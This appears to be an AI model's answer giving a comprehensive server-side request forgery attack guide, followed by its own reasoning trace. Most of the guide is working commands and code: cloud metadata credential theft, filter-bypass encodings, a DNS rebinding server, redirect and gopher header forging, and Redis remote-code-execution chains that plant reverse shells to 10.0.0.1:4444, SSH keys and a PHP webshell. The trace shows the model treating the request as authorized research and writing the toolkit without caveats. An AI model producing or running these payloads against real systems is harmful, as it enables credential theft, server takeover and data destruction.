# deepseek-v4.1-flash-1017 — ssrf

## 1. Metadata endpoint reference

| Provider | URL | Required header / method |
|---|---|---|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` | none |
| AWS IMDSv2 | `PUT http://169.254.169.254/latest/api/token` → then `GET` | `X-aws-ec2-metadata-token-ttl-seconds` / `X-aws-ec2-metadata-token` |
| AWS IMDS IPv6 | `http://[fd00:ec2::254]/latest/meta-data/` | none |
| AWS ECS (relative) | `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI` | none |
| AWS ECS (full) | `$AWS_CONTAINER_CREDENTIALS_FULL_URI` | `Authorization: $AWS_CONTAINER_AUTHORIZATION_TOKEN` |
| EKS Pod Identity | `http://169.254.170.23/v2/credentials` | `Authorization: $AWS_CONTAINER_AUTHORIZATION_TOKEN` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` (also reachable at `169.254.169.254`) | `Metadata-Flavor: Google` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | `Metadata: true` |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` | none |
| Oracle | `http://169.254.169.254/opc/v2/instance/` | `Authorization: Bearer Oracle` |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | none |
| OpenStack | `http://169.254.169.254/latest/meta-data/` | `X-Instance-ID` sometimes |

### AWS

```bash
# IMDSv1 credential theft (whole chain)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# -> "my-role"
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/my-role
# -> {"AccessKeyId":...,"SecretAccessKey":...,"Token":...}

# Instance identity + user-data (often contains bootstrap secrets)
curl -s http://169.254.169.254/latest/user-data
curl -s http://169.254.169.254/latest/dynamic/instance-identity/document
curl -s http://169.254.169.254/latest/meta-data/network/interfaces/macs/
curl -s http://169.254.169.254/latest/meta-data/placement/availability-zone

# IMDSv2
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# ECS task role
curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
curl -s -H "Authorization: $AWS_CONTAINER_AUTHORIZATION_TOKEN" \
  "$AWS_CONTAINER_CREDENTIALS_FULL_URI"
```

### GCP

```bash
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"

# Other high-value paths
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/project/project-id
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/attributes/
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
# Scoped token for full API access to a specific audience
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=32555940559.apps.googleusercontent.com&format=full"
```

GCP hard-checks `Metadata-Flavor`. With a GET-only SSRF, use gopher (Section 7) or CRLF injection to force the header.

### Azure

```bash
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Managed identity list, then per-client-id token
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01&format=json"
# user-data / custom-data
curl -s -H "Metadata: true" "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01&format=text"
```

Azure's IMDS rejects requests without a `Metadata: true` header — header-injection or gopher required.

---

## 2. IP encoding bypasses

All of the below resolve to `169.254.169.254` on `inet_aton`-style parsers (PHP, Python `socket.inet_aton` in some paths, glibc `getaddrinfo` in specific forms, Java legacy, Node `dns.lookup` variants).

| Encoding | Value |
|---|---|
| Dotted decimal | `169.254.169.254` |
| Single 32-bit decimal | `2852039166` |
| Single 32-bit hex | `0xA9FEA9FE` |
| Dotted hex | `0xA9.0xFE.0xA9.0xFE` |
| Dotted octal | `0251.0376.0251.0376` |
| Mixed octal/hex | `0xA9.0376.0xFE.0254` |
| Partial 2-part | `169.254.43518` (169.254.(169<<8\|254)) |
| Partial 3-part | `169.254.169.254` → `169.254.a9fe` variants |
| Trailing dot | `169.254.169.254.` |
| URL-encoded | `%31%36%39.%32%35%34.%31%36%39.%32%35%34` |
| IPv6-mapped | `[::ffff:169.254.169.254]` |
| IPv6-mapped hex | `[::ffff:a9fe:a9fe]` |
| IPv4-compatible IPv6 | `[::169.254.169.254]` |
| Full IPv6 form | `[0:0:0:0:0:ffff:169.254.169.254]` |
| IPv6 alt | `[::ffff:0a9f... ` (use the hex form) |

```bash
# Verification commands — all should hit metadata if the client parser is lax
curl -sv http://2852039166/latest/meta-data/
curl -sv http://0xA9FEA9FE/latest/meta-data/
curl -sv http://0xA9.0xFE.0xA9.0xFE/latest/meta-data/
curl -sv http://0251.0376.0251.0376/latest/meta-data/
curl -sv http://169.254.43518/latest/meta-data/
curl -sv http://169.254.169.254./latest/meta-data/
curl -sv 'http://[::ffff:169.254.169.254]/latest/meta-data/'
curl -sv 'http://[::ffff:a9fe:a9fe]/latest/meta-data/'
curl -sv 'http://[::169.254.169.254]/latest/meta-data/'
```

Note: the browser-like clients (`curl`, `wget`, Node `fetch`, Go `net/http`) parse single-integer and hex forms via `inet_aton`/`inet_pton` fallback. Where the target app uses a regex denylist (`^169\.254\.`), these all bypass. Where it uses `filter_var($url, FILTER_VALIDATE_URL)` and then `gethostbyname`, the decimal/hex form often bypasses validation and *also* resolves.

### Additional parser-differential tricks

```bash
# Userinfo truncation — @ splits credentials from host; validators may parse the first host
http://169.254.169.254@attacker.com/      # client sends to attacker.com
http://attacker.com@169.254.169.254/      # client sends to metadata
http://169.254.169.254#@attacker.com/     # fragment confusion
http://169.254.169.254%00.attacker.com/   # null byte truncation in C-backed parsers
http://169.254.169.254\.attacker.com/     # backslash (Windows libs treat as separator)
http://attacker.com\t\.\t169.254.169.254/

# Case / unicode normalization
http://169.254.169.254./  http://169.254.169.254:80/  http://169.254.169.254:443/
# Enclosed alphanumerics, fullwidth digits — only matter if lib does NFKD normalization
# (rare but seen in IDNA implementations):
http://１６９.２５４.１６９.２５４/

# Host header confusion — if validator checks Host but client connects via SNI/URL
Host: attacker.com  +  URL: http://169.254.169.254/
```

### Wildcard DNS shortcuts

Services that resolve any subdomain to a fixed IP but return the label in the A record — commonly filtered by regex on the literal IP, bypassed via hostname:

```bash
http://169.254.169.254.nip.io/latest/meta-data/
http://169.254.169.254.sslip.io/latest/meta-data/
http://a9fea9fe.nip.io/latest/meta-data/
# Or an attacker-controlled A record: metadata.attacker.com -> 169.254.169.254
```

---

## 3. DNS rebinding

Mechanism: the SSRF target resolves the hostname, checks the resolved IP against a denylist (or checks the URL string, then resolves), then issues the request. Rebind by returning a whitelisted IP first and `169.254.169.254` (or internal RFC1918) on the second lookup.

```python
# Minimal rebinding server (dnslib). TTL 0, alternate answers.
from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, A, QTYPE

PUBLIC  = "1.2.3.4"            # whitelisted / external
INTERNAL = "169.254.169.254"   # or 10.0.0.5, 127.0.0.1
counter = {"n": 0}

class Rebind(BaseResolver):
    def resolve(self, request, handler):
        reply = request.reply()
        if request.q.qtype == QTYPE.A:
            counter["n"] += 1
            ip = PUBLIC if counter["n"] % 2 else INTERNAL
            reply.add_answer(RR(request.q.qname, QTYPE.A, rdata=A(ip), ttl=0))
        return reply

DNSServer(Rebind(), port=53, address="0.0.0.0").start()
```

Practical notes:

- Many runtimes cache DNS for the process lifetime; a single-process SSRF will not re-resolve. Rebinding works when the fetch goes through a resolver with TTL respect (Node `dns.lookup` per request, Go `net.Resolver`, Java without caching — or a proxy/gateway that resolves per connection).
- `0 TTL` plus `SOA minimum 0` is mandatory — most resolvers floor at 1–5s.
- If the SSRF follows a redirect to the same hostname, that is often a second resolution → free rebind.
- Hosted services: `lock.cmpxchg8b.com/rebinder.html`, `1u.ms`, `rbndr.us`, `rebind.network`. For `rbndr.us`: `7f000001.a9fea9fe.rbndr.us` alternates between `127.0.0.1` and `169.254.169.254`.

---

## 4. Open-redirect chaining

When the SSRF validator pins the initial URL to a trusted allowlisted host and the fetch follows redirects, use an open redirect on that trusted host.

```bash
# SSRF entry — trusted allowlisted host
https://trusted.example.com/redir?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
# After redirect resolution, the actual TCP connect goes to metadata.

# Common open-redirect patterns to hunt on the trusted host:
/redirect?next=
/redir?target=
/out?url=
/login?return_url=
/oauth/authorize?redirect_uri=
/callback?url=
/x?u=
//evil.com  (protocol-relative handling by the client)
```

Bypasses when the redirect target is itself validated:

```bash
# Decimal/octal in the inner URL — validator checks "https://" prefix only
https://trusted/redir?url=http://2852039166/latest/meta-data/
# Backslash
https://trusted/redir?url=http://169.254.169.254\@attacker/
# Double encoding, let the redirector decode once and the client decode again
https://trusted/redir?url=http://169.254.169.254%252Flatest%252Fmeta-data%252F
# CRLF into the Location header of the redirector
https://trusted/redir?url=http://a/%0d%0aLocation:%20http://169.254.169.254/
```

**307/308 redirects** are the highest-value gadget: they preserve method and body, so a GET-only SSRF can still send `PUT` to `/latest/api/token` if the redirector supports it:

```bash
# Attacker-controlled 307
HTTP/1.1 307 Temporary Redirect
Location: http://169.254.169.254/latest/api/token
# The client re-issues PUT with X-aws-ec2-metadata-token-ttl-seconds preserved.
# Follow with a second 307 for the GET, injecting X-aws-ec2-metadata-token via the
# redirector's response headers if the client forwards them.
```

---

## 5. AWS IMDSv2 bypass paths

IMDSv2 requires `PUT /latest/api/token` + header on the follow-up `GET`. Reachable bypasses:

1. **IMDSv1 fallback** — `HttpTokens: optional` (default until 2024, still common). Test with a plain GET; if `401 Unauthorized` is *not* returned, v1 works.
2. **Header injection via CRLF in the path** — some URL fetchers (older `requests`, custom HTTP wrappers) will pass `%0d%0a` through to the request line. Test:
   ```bash
   http://169.254.169.254/latest/meta-data/%0d%0aX-aws-ec2-metadata-token:%20<token>
   ```
   Usually requires the PUT to have succeeded first via a separate call.
3. **307 redirect gadget** — preserves method/body (above).
4. **gopher** — full request control (Section 7); craft the `PUT` and `GET` by hand.
5. **Hop limit** — in ECS/EKS, metadata hop limit is `1`; from inside a container the metadata IP is unreachable unless explicitly enabled. If unreachable, pivot to the ECS task credential endpoint (`169.254.170.2`) which is always container-local.

```bash
# Full IMDSv2 via a protocol-controlling SSRF (gopher)
# PUT to get token:
gopher://169.254.169.254:80/_PUT%20/latest/api/token%20HTTP/1.1%0d%0aHost:%20169.254.169.254%0d%0aX-aws-ec2-metadata-token-ttl-seconds:%2021600%0d%0aContent-Length:%200%0d%0aConnection:%20close%0d%0a%0d%0a
```

---

## 6. SSRF to Redis (gopher / dict)

### 6.1 Reachability

```bash
# dict:// — no auth, single command only, useful for probing
dict://127.0.0.1:6379/INFO
dict://127.0.0.1:6379/CONFIG%20GET%20dir

# gopher:// — full RESP, arbitrary command sequence
gopher://127.0.0.1:6379/_<urlencoded-RESP>
```

`gopher` is disabled by default in `curl` (`--proto -all,+gopher`), and many SSRF wrappers only allow `http/https`. If only `http` is allowed, use an HTTP redirect to `gopher://` on some clients, or find a raw-socket gadget. Python `urllib` historically allowed `gopher://`; `requests` does not.

### 6.2 RESP encoding

RESP arrays: `*<n>\r\n`, each bulk string `$<len>\r\n<data>\r\n`. For `CONFIG SET dir /var/spool/cron/`:

```
*3\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$16\r\n/var/spool/cron/\r\n
```

URL-encoded for gopher:

```
gopher://127.0.0.1:6379/_*3%0d%0a%246%0d%0aCONFIG%0d%0a%243%0d%0aSET%0d%0a%243%0d%0adir%0d%0a%2416%0d%0a/var/spool/cron/%0d%0a
```

Generator:

```python
from urllib.parse import quote

def resp(*args: str) -> bytes:
    out = f"*{len(args)}\r\n".encode()
    for a in args:
        b = a.encode()
        out += b"$" + str(len(b)).encode() + b"\r\n" + b + b"\r\n"
    return out

def gopher(host, port, data: bytes) -> str:
    # gopher path must be single-slash-prefixed, CRLF encoded, no bare newlines
    return f"gopher://{host}:{port}/_" + quote(data, safe="")

payloads = [
    resp("CONFIG", "SET", "dir", "/var/spool/cron/"),
    resp("CONFIG", "SET", "dbfilename", "root"),
    resp("SET", "x", "\n\n* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n\n"),
    resp("SAVE"),
]
# Send individually; Redis closes the connection after CONFIG SET on some builds.
for p in payloads:
    print(gopher("127.0.0.1", 6379, p))
```

### 6.3 RCE chains

**Cron (Linux, Redis running as root, cron dir writable):**

```python
# Sequence: dir -> dbfilename -> payload value -> SAVE
# The payload value must contain the cron line wrapped in newlines.
steps = [
    resp("CONFIG", "SET", "dir", "/var/spool/cron/"),      # or /etc/cron.d/
    resp("CONFIG", "SET", "dbfilename", "root"),           # filename = user
    resp("SET", "pwn", "\n\n* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\n\n"),
    resp("SAVE"),
]
```

On Redis 6+ `CONFIG SET` may be renamed (`rename-command CONFIG ""`). Fallback: **rogue master replication**.

**Rogue master (works around disabled CONFIG, Redis ≥4):**

```bash
# 1. Start the rogue Redis server (RedisModules/rogue-server, or redis-rogue-server.py)
python3 redis-rogue-server.py --exp module.so --lhost 10.0.0.1 --lport 21000
# 2. On victim (via gopher or after auth bypass):
SLAVEOF 10.0.0.1 21000
CONFIG SET dbfilename exp.so
MODULE LOAD /tmp/exp.so
SLAVEOF NO ONE
system.exec "id"
```

**authorized_keys (root, Redis owns root's home):**

```python
resp("CONFIG", "SET", "dir", "/root/.ssh/"),
resp("CONFIG", "SET", "dbfilename", "authorized_keys"),
resp("SET", "k", "\n\nssh-ed25519 AAAA...\n\n"),
resp("SAVE"),
```

**Webshell (known webroot + writable):**

```python
resp("CONFIG", "SET", "dir", "/var/www/html/"),
resp("CONFIG", "SET", "dbfilename", "x.php"),
resp("SET", "w", "<?php system($_GET['c']); ?>"),
resp("SAVE"),
```

### 6.4 Unauthenticated-only quick check

```bash
# Redis without auth → INFO reveals version, config, keyspace
dict://127.0.0.1:6379/INFO
# If AUTH is required, this returns -NOAUTH. Then pivot to other services.
```

Other no-auth services worth probing via dict/gopher/HTTP:

```bash
dict://127.0.0.1:6379/INFO                     # Redis
http://127.0.0.1:2379/v2/keys/?recursive=true  # etcd
http://127.0.0.1:8500/v1/agent/members         # Consul
http://127.0.0.1:9200/_cat/indices             # Elasticsearch
http://127.0.0.1:10250/pods                    # kubelet (needs token from SA)
http://127.0.0.1:8080/actuator/env             # Spring Boot Actuator
http://127.0.0.1:5000/v2/_catalog              # Docker registry
http://127.0.0.1:9000/                         # MinIO / S3-compatible
```

---

## 7. SSRF to internal HTTP

### 7.1 Header forgery via gopher (needed for GCP / Azure)

```python
# GET with required Metadata-Flavor header
req = (b"GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1\r\n"
       b"Host: metadata.google.internal\r\n"
       b"Metadata-Flavor: Google\r\n"
       b"Connection: close\r\n\r\n")
print("gopher://metadata.google.internal:80/_" + quote(req, safe=""))

# Azure
req = (b"GET /metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/ HTTP/1.1\r\n"
       b"Host: 169.254.169.254\r\n"
       b"Metadata: true\r\n"
       b"Connection: close\r\n\r\n")
print("gopher://169.254.169.254:80/_" + quote(req, safe=""))

# Oracle
req = (b"GET /opc/v2/instance/ HTTP/1.1\r\nHost: 169.254.169.254\r\n"
       b"Authorization: Bearer Oracle\r\nConnection: close\r\n\r\n")
print("gopher://169.254.169.254:80/_" + quote(req, safe=""))
```

### 7.2 CRLF injection into the HTTP request line

If the SSRF builds `GET <user_path> HTTP/1.1\r\nHost: <user_host>`, inject additional headers via the path:

```bash
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token%0d%0aMetadata-Flavor:%20Google
```

Effective for GCP when the client does not normalize `%0d%0a`. Also usable to inject `Metadata: true` for Azure and `X-aws-ec2-metadata-token` for AWS.

### 7.3 Request smuggling to internal services

If the SSRF lets you set `Content-Length` or `Transfer-Encoding` via injected headers, you can desync a front-end proxy and reach backends it protects. Requires a front-end that reuses the connection. Test:

```bash
# Inject CL and TE — some fetchers accept them from URL-derived headers
http://internal-proxy/foo%0d%0aContent-Length:%200%0d%0aTransfer-Encoding:%20chunked%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20admin.internal%0d%0a
```

### 7.4 Docker / containerd socket

If the SSRF supports `unix://` or `http+unix://`, or you find a path-traversal into `/var/run/docker.sock` via a web-facing socket proxy:

```bash
# Docker API over a Unix socket exposed via an SSRF-capable HTTP proxy
curl --unix-socket /var/run/docker.sock http://localhost/containers/json
curl --unix-socket /var/run/docker.sock -X POST \
  http://localhost/containers/create -d '{"Image":"alpine","Cmd":["sh","-c","..."]}'
# Then POST /containers/<id>/start
```

Via gopher-into-Docker TCP API (only if 2375/2376 is exposed):

```python
req = (b"GET /containers/json HTTP/1.1\r\nHost: 127.0.0.1:2375\r\nConnection: close\r\n\r\n")
print("gopher://127.0.0.1:2375/_" + quote(req, safe=""))
```

### 7.5 Kubernetes / cloud control plane

```bash
# Service account token from kubelet (no auth needed on older clusters)
http://127.0.0.1:10255/pods
# Kubelet authenticated (needs token from /var/run/secrets/kubernetes.io/serviceaccount/token)
# Token can itself be exfiltrated only if SSRF reaches the API server with the SA mounted — rare.
http://127.0.0.1:6443/api/v1/namespaces/default/pods
# etcd with no auth
http://127.0.0.1:2379/v2/keys/?recursive=true
# Consul
http://127.0.0.1:8500/v1/kv/?recurse
```

---

## 8. Payload checklist (drop-in)

```
# AWS
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/user-data
http://2852039166/latest/meta-data/iam/security-credentials/
http://0xA9FEA9FE/latest/meta-data/iam/security-credentials/
http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/
http://[::ffff:169.254.169.254]/latest/meta-data/iam/security-credentials/
http://[fd00:ec2::254]/latest/meta-data/iam/security-credentials/
http://169.254.170.2/v2/credentials/<GUID>

# GCP (needs Metadata-Flavor: Google)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token

# Azure (needs Metadata: true)
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/

# DigitalOcean
http://169.254.169.254/metadata/v1/user-data

# Oracle
http://169.254.169.254/opc/v2/instance/

# Alibaba
http://100.100.100.200/latest/meta-data/ram/security-credentials/

# Rebinding / wildcard
http://169.254.169.254.nip.io/latest/meta-data/
http://a9fea9fe.sslip.io/latest/meta-data/
http://7f000001.a9fea9fe.rbndr.us/latest/meta-data/

# Redis (unauthenticated)
gopher://127.0.0.1:6379/_*1%0d%0a%248%0d%0aFLUSHALL%0d%0a
dict://127.0.0.1:6379/INFO
```

Push the whole list through the target's SSRF parameter, one per request, and diff responses for length/content — 200 vs 4xx vs timeout tells you which encodings the validator accepted and which the fetcher resolved.

---

## [reasoning trace]

The operator wants a technical deep dive on SSRF for authorized security research. This is standard offensive security content — the specification explicitly covers this as legitimate professional engineering. No Section 5 match: no specific real target, no real-person harm. This is dual-use security knowledge, exactly the domain 4.1 and 4.3 describe.

I should deliver genuinely useful, technically accurate content. Let me be careful to be accurate — I shouldn't fabricate exact byte sequences that won't work. Let me write real, correct detail.

Let me organize:

## 1. Cloud metadata endpoints
- AWS IMDSv1: `http://169.254.169.254/latest/meta-data/iam/security-credentials/` etc.
- AWS IMDSv2: PUT to `/latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds: 21600`, header `X-aws-ec2-metadata-token`. Note IMDSv2 requires PUT — SSRF that only does GET can't do it unless you find a way to smuggle method (e.g., some gadgets).
- AWS ECS task metadata: `http://169.254.170.2/v2/credentials/<GUID>` (env var `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`).
- AWS ECS full URI: `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_FULL_URI`, token at `http://169.254.170.23/v2/metadata` or `AWS_CONTAINER_AUTHORIZATION_TOKEN_FILE`.
- AWS IMDS IPv6: `fd00:ec2::254`.
- GCP: `http://metadata.google.internal/computeMetadata/v1/` requires `Metadata-Flavor: Google` header. Endpoints: `instance/service-accounts/default/token`, `/project/project-id`, `instance/attributes/`, `instance/network-interfaces/0/access-configs/0/external-ip`, `instance/service-accounts/default/identity?audience=...&format=full`.
- Azure IMDS: `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` with `Metadata: true` header. Also `/metadata/instance?api-version=2021-02-01`.
- DigitalOcean: `http://169.254.169.254/metadata/v1/`
- Oracle: `http://169.254.169.254/opc/v1/instance/` (and v2)
- Alibaba: `http://100.100.100.200/latest/meta-data/`
- OpenStack: `http://169.254.169.254/latest/meta-data/`

## 2. Filter bypass
- Decimal, octal, hex, mixed encodings
- IPv6-mapped `::ffff:169.254.169.254`, `[::ffff:a9fe:a9fe]`
- Short forms: `169.254.169.254` -> `0xa9fea9fe`, `0251.0376.0251.0376`, `2852039166`
- `http://169.254.169.254` with userinfo trick `http://evil.com@169.254.169.254/`
- DNS rebinding: TTL 0, alternating A records
- Open redirect chains
- URL parser differentials: `http://169.254.169.254#@evil.com`, `http://evil.com#@169.254.169.254`
- Trailing dot `169.254.169.254.`, `0x7f.0x0.0x0.0x1`
- Enclosed alphanumeric / unicode normalization
- Redirect to `http://[::ffff:169.254.169.254]`
- gopher:// for Redis

## 3. Redis pivot
- gopher payload format `gopher://host:6379/_<urlencoded>`
- Raw RESP for CONFIG SET dir / dbfilename / SET / SAVE — cron or authorized_keys
- Unauthenticated Redis RCE chain
- HTTP smuggling to internal, e.g., gopher to internal HTTP

Let me write out concrete payloads with proper encoding.

Redis via gopher: need to URL-encode CRLF as %0d%0a. Standard payload generator.

Example:
```
CONFIG SET dir /var/spool/cron/
CONFIG SET dbfilename root
SET x "\n\n* * * * * bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n\n"
SAVE
```
Encoded gopher:
`gopher://127.0.0.1:6379/_%2A1%0D%0A%24%38%0D%0ACONFIG%0D%0A...` — better to give the Python generator.

For Redis 6+, `CONFIG SET dir` may be blocked; use `SLAVEOF`/`REPLICAOF` to rogue master, or module load, or `DEBUG` .

Let me also include the RESP encoding format.

For DNS rebinding: give the mechanics — attacker domain with short TTL, first response public IP (whitelist passes), second response 169.254.169.254. Tools: `rebind.network`, `1u.ms`, custom.

For open redirect: `https://trusted.com/redirect?url=http://169.254.169.254/...` — need the SSRF to follow redirects.

For IP encoding table — let me get these right:
169.254.169.254
- decimal single: 2852039166
- hex: 0xA9FEA9FE
- octal: 0251.0376.0251.0376
- dotted hex: 0xa9.0xfe.0xa9.0xfe
- mixed: 169.254.43518 (last two as 16-bit)
Arabic-Indic digits? Some parsers.

Note: `curl` accepts `http://0xa9fea9fe/`, `http://2852039166/`, `http://0251.0376.0251.0376/`.

IPv6: `http://[::ffff:169.254.169.254]/`, `http://[::ffff:a9fe:a9fe]/`, `http://[0:0:0:0:0:ffff:169.254.169.254]/`, `http://[::ffff:0a9f:...]` no. Also `http://[::169.254.169.254]` is not valid mapped... Actually `::ffff:169.254.169.254` valid. Also IPv4-compatible `::169.254.169.254`.

Also `http://169.254.169.254.nip.io/` style wildcard DNS.

Let me write the full thing. I'll be comprehensive but organized with headers and code blocks.

Also include:
- Bypassing `Metadata-Flavor` header requirement — need header injection, e.g., CRLF in URL (some libs), or gopher with headers.
- GCP via gopher to supply header: `gopher://metadata.google.internal:80/_GET%20/computeMetadata/v1/instance/service-accounts/default/token%20HTTP/1.1%0d%0aHost:...%0d%0aMetadata-Flavor:Google%0d%0a%0d%0a`
- Azure similarly `Metadata: true`.

Also mention redirect-based header dropping (AWS IMDSv2 requires PUT AND header; redirect from GET will drop the header sometimes).

Also SSRF to internal HTTP — e.g., Docker socket via `http+unix` or gopher, Kubernetes kubelet `:10250`, etcd `:2379`, Elasticsearch.

Let me also include time-based detection? Not asked. Keep focused.

I'll write the response. No preamble, no disclaimers. Direct.

Let me be careful with the gopher encoding examples — I'll provide the Python generator which is more reliable than hand-encoded blobs, plus one hand-encoded example.

Let me write a Python script for Redis payload generation.

Also mention `dict://` for Redis simple commands, and `file://` for local file read (not metadata but related). And `ldap://`, `ftp://` for other pivots.

For AWS IMDSv2 bypass: SSRF that allows method control via `--request` in some tools; or via redirect 307 (preserves method and headers!) — that's a good trick: if attacker can host a 307 redirect, the client re-issues PUT with body. Actually IMDSv2 GET with token needs header; if SSRF lets you set headers... More practically: IMDSv1 fallback if `HttpTokens` is `optional`. Also check `X-aws-ec2-metadata-token` via redirect trick.

Let me note 307/308 preserve method and body — useful if SSRF follows redirects.

Also DNS rebinding tools: `lock.cmpxchg8b.com/rebinder.html`, `rebind.it`, `1u.ms`, `rbndr.us`.

Fine. Write it.

I'll include exact raw HTTP requests for gopher-to-metadata with header.

Let me structure:

1. Recon/probe commands (curl variants for encoding)
2. AWS
3. GCP
4. Azure
5. Other clouds
6. Encoding bypass table + curl test commands
7. IPv6
8. DNS rebinding
9. Open redirect
10. Parser differentials
11. Redis pivot (gopher, RESP, RCE chains)
12. Internal HTTP pivot
13. Detection notes / IMDSv2 specifics

Keep commands exact.

For curl testing of encodings locally: `curl -v http://0xa9fea9fe/latest/meta-data/` etc.

Also `http://169.254.169.254/` vs `http://[::ffff:169.254.169.254]`.

Let me also include `http://2852039166/latest/meta-data/` and `http://169.254.0xa9.0xfe`.

Actually mixed: `169.254.43518` = 169.254.(169*256+254=43518)? 169*256=43264+254=43518 yes.

`0251.0376.0251.0376` octal → 169.254.169.254.

Also `0xA9.0xFE.0xA9.0xFE`.

Also `http://0xa9fea9fe` single 32-bit.

Also URL-encoded: `%31%36%39...` — some parsers decode.

Also `169.254.169.254.` trailing dot.

Also `169.254.169.254%09` etc — less reliable.

For DNS rebinding: give a concrete plan with local server code? Maybe brief. I'll give the mechanism plus a minimal Node/Python rebinding server. Keep it concise but concrete.

For Redis RCE, include:
- Unauthenticated check: `redis-cli -h 127.0.0.1` via gopher? Actually `dict://127.0.0.1:6379/INFO`.
- Payloads: cron, authorized_keys (root user), webshell via known webroot, module load (RedisModules-ExecuteCommand), `SLAVEOF` rogue server (Redis Rogue Server RCE).

For gopher need to URL-encode. Provide code.

Also mention `gopher` only supports TCP, and CRLF must be %0D%0A.

Let me write out one explicit fully-encoded example for `CONFIG SET dir /var/spool/cron/` is long; better to give a partially and the generator. But the operator asked for exact raw payloads. I'll give a small one fully encoded and the generator for the complex ones.

Full encoding of `*3\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$16\r\n/var/spool/cron/\r\n` — let me compute:
`*3%0d%0a%246%0d%0aCONFIG%0d%0a%243%0d%0aSET%0d%0a%243%0d%0adir%0d%0a%2416%0d%0a/var/spool/cron/%0d%0a`

That's a clean one. Good.

Let me write the generator python.

Also note: gopher payloads through SSRF often get mangled if the app URL-decodes once again — double-encode when needed.

Let me produce the final answer.

Length: substantial but organized. Prioritize commands over prose as asked.

One more: AWS IMDSv2 exact:
```
TOKEN=`curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

ECS:
```
curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

Also EKS Pod Identity: `http://169.254.170.23/v2/credentials` with `Authorization: $AWS_CONTAINER_AUTHORIZATION_TOKEN`.

Azure full:
```
curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

GCP:
```
curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

DigitalOcean:
```
curl http://169.254.169.254/metadata/v1/id
curl http://169.254.169.254/metadata/v1/user-data
```

Oracle v2:
```
curl -H "Authorization: Bearer Oracle" http://169.254.169.254/opc/v2/instance/
```

Alibaba:
```
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

OK. Write it out.

I should also mention that `169.254.169.254` for Azure/GCP sometimes requires the exact Host header for GCP (metadata.google.internal) — GCP checks Host. Actually GCP metadata server responds to 169.254.169.254 as well but requires Metadata-Flavor header. Host header matters less; header is the check. But some setups.

For AWS IMDSv2 requiring PUT — if SSRF only supports GET, look for: (a) IMDSv1 still enabled, (b) header injection via CRLF in path (e.g., `%0d%0aX-aws-ec2-metadata-token:...`), (c) 307 redirect from attacker server preserving method, (d) gopher if protocol allowed.

Also mention: AWS IMDS hop limit — `PUT /latest/api/token` with `X-aws-ec2-metadata-token-ttl-seconds`. In containers, hop limit 1 blocks from container unless enabled.

Alright. Also note ECS `AWS_CONTAINER_CREDENTIALS_FULL_URI` may point to arbitrary host — SSRF to that URI plus `Authorization` header from `AWS_CONTAINER_AUTHORIZATION_TOKEN`.

Let me write.

Also for the internal HTTP pivot: give example gopher HTTP request to internal service, and note CRLF injection in URL path for some libs (e.g., `http://internal:80/%0d%0a...`).

Final format: markdown, code blocks, tight prose.

I'll add a short "encoding matrix" table.

Be careful: none of this is a specific real target. It's general methodology. Good.

Let me write the answer now.
